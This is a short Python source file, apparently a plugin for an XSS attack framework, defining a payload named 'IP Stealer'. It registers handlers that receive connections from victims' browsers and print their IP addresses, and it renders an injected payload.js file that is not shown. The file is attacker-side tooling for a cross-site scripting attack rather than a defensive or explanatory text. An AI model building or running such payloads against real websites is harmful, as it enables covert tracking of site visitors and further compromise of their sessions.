from simplexss.api import (
    BasePayload,
    BaseClient,
    BaseEvent,
    render
)


class Payload(BasePayload):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Allows you to find out IP.'
    NAME = 'IP Stealer'
    VERSION = '0.0.1'

    async def on_ip(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'IP: {event.data.get("ip", "unknown")}')

    async def on_connection(self, client: BaseClient, event: BaseEvent):
        await self.io.print(f'Connection established: {client.origin}')

    def bind_endpoints(self):
        self.transport.bind_endpoint('connection', self.on_connection)
        self.transport.bind_endpoint('ip', self.on_ip)

    @property
    def payload(self) -> str:
        return render(self.directory, 'payload.js', )
